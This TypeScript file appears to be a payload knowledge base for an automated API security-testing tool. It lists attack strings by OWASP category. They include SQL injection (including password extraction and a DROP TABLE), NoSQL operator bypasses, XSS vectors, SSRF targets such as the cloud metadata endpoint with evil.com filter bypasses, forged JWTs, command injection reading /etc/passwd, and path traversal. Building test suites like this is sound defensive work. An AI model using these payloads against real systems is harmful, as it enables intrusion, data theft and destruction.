/**
 * Payload Patterns Knowledge Base
 *
 * Common attack payloads organized by category.
 * These are selectively included in Phase B prompts and payload generation.
 */

export interface PayloadEntry {
  value: string;                      // The actual payload string
  description: string;                // What it tests for
  context: string;                    // Where to use it: "string field", "url parameter", "json body", etc.
}

export interface PayloadPattern {
  id: string;
  category: string;                   // "sql-injection", "xss", "ssrf", "auth-bypass", etc.
  name: string;
  applicableCategories: string[];     // OWASP category IDs
  payloads: PayloadEntry[];
}

export function getPayloadsForCategory(categoryId: string): PayloadPattern[] {
  const all = getAllPayloadPatterns();
  return all.filter(p => p.applicableCategories.includes(categoryId));
}

export function getAllPayloadPatterns(): PayloadPattern[] {
  return [
    ...SQL_INJECTION_PAYLOADS,
    ...NOSQL_INJECTION_PAYLOADS,
    ...XSS_PAYLOADS,
    ...SSRF_PAYLOADS,
    ...AUTH_BYPASS_PAYLOADS,
    ...COMMAND_INJECTION_PAYLOADS,
    ...BOUNDARY_VALUE_PAYLOADS,
    ...PATH_TRAVERSAL_PAYLOADS,
  ];
}

// SQL Injection payloads
const SQL_INJECTION_PAYLOADS: PayloadPattern[] = [
  {
    id: "sql-basic",
    category: "sql-injection",
    name: "Basic SQL Injection",
    applicableCategories: ["API8"],
    payloads: [
      {
        value: "' OR '1'='1",
        description: "Classic authentication bypass",
        context: "string field in WHERE clause"
      },
      {
        value: "' OR 1=1--",
        description: "Comment-based bypass",
        context: "string field"
      },
      {
        value: "admin'--",
        description: "User impersonation",
        context: "username field"
      },
      {
        value: "' UNION SELECT NULL, username, password FROM users--",
        description: "UNION-based data extraction",
        context: "string field"
      },
      {
        value: "'; DROP TABLE users; --",
        description: "Stacked query for data destruction",
        context: "any string field"
      },
      {
        value: "' AND SLEEP(5)--",
        description: "Time-based blind injection",
        context: "string field"
      },
      {
        value: "1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a",
        description: "Boolean-based data extraction",
        context: "numeric or string field"
      },
    ]
  },
  {
    id: "sql-error-based",
    category: "sql-injection",
    name: "Error-Based SQL Injection",
    applicableCategories: ["API8"],
    payloads: [
      {
        value: "' AND extractvalue(1, concat(0x7e, database(), 0x7e))--",
        description: "MySQL error-based extraction",
        context: "string field"
      },
      {
        value: "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='u'))--",
        description: "MSSQL error-based extraction",
        context: "string field"
      },
      {
        value: "' AND 1=cast((SELECT password FROM users LIMIT 1) as int)--",
        description: "PostgreSQL cast error extraction",
        context: "string field"
      },
    ]
  },
];

// NoSQL Injection payloads
const NOSQL_INJECTION_PAYLOADS: PayloadPattern[] = [
  {
    id: "nosql-mongodb",
    category: "nosql-injection",
    name: "MongoDB NoSQL Injection",
    applicableCategories: ["API8"],
    payloads: [
      {
        value: "{\"$ne\": null}",
        description: "Not equal operator bypass",
        context: "JSON body field"
      },
      {
        value: "{\"$gt\": \"\"}",
        description: "Greater than bypass",
        context: "JSON body field"
      },
      {
        value: "{\"$regex\": \".*\"}",
        description: "Regex match all bypass",
        context: "JSON body field"
      },
      {
        value: "{\"$where\": \"this.username == 'admin'\"}",
        description: "JavaScript code execution",
        context: "JSON body field"
      },
      {
        value: "username[$ne]=null&password[$ne]=null",
        description: "PHP array notation bypass",
        context: "URL parameters"
      },
    ]
  },
];

// XSS payloads
const XSS_PAYLOADS: PayloadPattern[] = [
  {
    id: "xss-reflected",
    category: "xss",
    name: "Reflected XSS",
    applicableCategories: ["API8"],
    payloads: [
      {
        value: "<script>alert(1)</script>",
        description: "Basic script injection",
        context: "any string field"
      },
      {
        value: "<img src=x onerror=alert(1)>",
        description: "Image tag error handler",
        context: "any string field"
      },
      {
        value: "<svg onload=alert(1)>",
        description: "SVG onload event",
        context: "any string field"
      },
      {
        value: "javascript:alert(1)",
        description: "JavaScript protocol",
        context: "URL fields"
      },
      {
        value: "<iframe src='javascript:alert(1)'>",
        description: "iframe injection",
        context: "HTML fields"
      },
      {
        value: "\"<script>alert(String.fromCharCode(88,83,83))</script>",
        description: "Encoded script injection",
        context: "string fields with filtering"
      },
      {
        value: "<body onload=alert(1)>",
        description: "Body onload event",
        context: "HTML content fields"
      },
    ]
  },
];

// SSRF payloads
const SSRF_PAYLOADS: PayloadPattern[] = [
  {
    id: "ssrf-internal",
    category: "ssrf",
    name: "Internal Service SSRF",
    applicableCategories: ["API7"],
    payloads: [
      {
        value: "http://127.0.0.1:8080/admin",
        description: "Localhost admin endpoint",
        context: "URL field"
      },
      {
        value: "http://localhost:22",
        description: "Local SSH port",
        context: "URL field"
      },
      {
        value: "http://169.254.169.254/latest/meta-data/",
        description: "AWS metadata service",
        context: "URL field"
      },
      {
        value: "http://192.168.1.1",
        description: "Private network IP",
        context: "URL field"
      },
      {
        value: "http://10.0.0.1",
        description: "Internal network IP",
        context: "URL field"
      },
      {
        value: "file:///etc/passwd",
        description: "Local file read (if file:// protocol allowed)",
        context: "URL field"
      },
    ]
  },
  {
    id: "ssrf-bypass",
    category: "ssrf",
    name: "SSRF Filter Bypass",
    applicableCategories: ["API7"],
    payloads: [
      {
        value: "http://0177.0.0.1",
        description: "Octal IP encoding",
        context: "URL field"
      },
      {
        value: "http://2130706433",  // 127.0.0.1 in decimal
        description: "Decimal IP encoding",
        context: "URL field"
      },
      {
        value: "http://127.0.1",  // 127.0.0.1 with stripped zeros
        description: "IP address format variation",
        context: "URL field"
      },
      {
        value: "http://127.0.0.1@evil.com/",
        description: "@ symbol bypass",
        context: "URL field"
      },
      {
        value: "http://evil.com#@127.0.0.1/",
        description: "Fragment bypass",
        context: "URL field"
      },
    ]
  },
];

// Auth bypass payloads
const AUTH_BYPASS_PAYLOADS: PayloadPattern[] = [
  {
    id: "auth-jwt",
    category: "auth-bypass",
    name: "JWT Manipulation",
    applicableCategories: ["API2"],
    payloads: [
      {
        value: "{\"alg\": \"none\", \"typ\": \"JWT\"}.{}.eyJyb2xlIjoiYWRtaW4ifQ.",
        description: "None algorithm unsigned token",
        context: "Authorization header"
      },
      {
        value: "{\"alg\": \"HS256\", \"typ\": \"JWT\"}.{}.eyJyb2xlIjoiYWRtaW4ifQ.",
        description: "Algorithm confusion (RS256 to HS256)",
        context: "Authorization header"
      },
      {
        value: "{\"alg\": \"HS256\"}.<payload>.<re-sign-with-public-key>",
        description: "Re-sign with exposed public key",
        context: "Authorization header"
      },
    ]
  },
  {
    id: "auth-session",
    category: "auth-bypass",
    name: "Session Fixation",
    applicableCategories: ["API2"],
    payloads: [
      {
        value: "SessionId=known_valid_session_id",
        description: "Reuse another user's session cookie",
        context: "Cookie header"
      },
      {
        value: "SessionId=admin; Path=/",
        description: "Set privileged session cookie",
        context: "Cookie header"
      },
    ]
  },
];

// Command injection payloads
const COMMAND_INJECTION_PAYLOADS: PayloadPattern[] = [
  {
    id: "cmd-basic",
    category: "command-injection",
    name: "Basic Command Injection",
    applicableCategories: ["API8"],
    payloads: [
      {
        value: "; ls -la",
        description: "Semicolon command separator",
        context: "string field passed to shell"
      },
      {
        value: "&& whoami",
        description: "AND command separator",
        context: "string field"
      },
      {
        value: "| cat /etc/passwd",
        description: "Pipe command separator",
        context: "string field"
      },
      {
        value: "`id`",
        description: "Backtick command substitution",
        context: "string field"
      },
      {
        value: "$(whoami)",
        description: "Dollar sign command substitution",
        context: "string field"
      },
      {
        value: "|| cat /etc/passwd #",
        description: "OR separator with comment",
        context: "string field"
      },
    ]
  },
];

// Boundary value payloads
const BOUNDARY_VALUE_PAYLOADS: PayloadPattern[] = [
  {
    id: "boundary-numeric",
    category: "boundary-values",
    name: "Numeric Boundary Testing",
    applicableCategories: ["API4", "API8"],
    payloads: [
      { value: "-1", description: "Negative number", context: "numeric field" },
      { value: "0", description: "Zero boundary", context: "numeric field" },
      { value: "2147483647", description: "Max 32-bit int", context: "numeric field" },
      { value: "2147483648", description: "Max int + 1 overflow", context: "numeric field" },
      { value: "9223372036854775807", description: "Max 64-bit int", context: "numeric field" },
      { value: "3.1415926535897932384626433832795028841971", description: "Excessive precision", context: "numeric field" },
      { value: "1e309", description: "Infinity overflow", context: "numeric field" },
    ]
  },
  {
    id: "boundary-string",
    category: "boundary-values",
    name: "String Boundary Testing",
    applicableCategories: ["API4", "API8"],
    payloads: [
      { value: "", description: "Empty string", context: "string field" },
      { value: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", description: "Long string (100 chars)", context: "string field" },
      { value: "A".repeat(10000), description: "Very long string (10k chars)", context: "string field" },
      { value: "%00", description: "Null byte", context: "string field" },
      { value: "%0A", description: "Newline character", context: "string field" },
      { value: "🔥🔥🔥", description: "Unicode emoji", context: "string field" },
      { value: "아가다가", description: "Non-Latin script", context: "string field" },
    ]
  },
];

// Path traversal payloads
const PATH_TRAVERSAL_PAYLOADS: PayloadPattern[] = [
  {
    id: "path-basic",
    category: "path-traversal",
    name: "Basic Path Traversal",
    applicableCategories: ["API1"],
    payloads: [
      {
        value: "../etc/passwd",
        description: "Basic parent directory traversal",
        context: "path parameter"
      },
      {
        value: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        description: "Windows backslash traversal",
        context: "path parameter"
      },
      {
        value: "....//....//....//etc/passwd",
        description: "Double encoding bypass",
        context: "path parameter"
      },
      {
        value: "%2e%2e%2f",
        description: "URL-encoded traversal",
        context: "path parameter"
      },
      {
        value: "..%252f..%252f..%252fetc/passwd",
        description: "Double URL encoding",
        context: "path parameter"
      },
      {
        value: "....//",
        description: "Variant encoding",
        context: "path parameter"
      },
      {
        value: "/etc/passwd",
        description: "Absolute path",
        context: "path parameter"
      },
    ]
  },
];
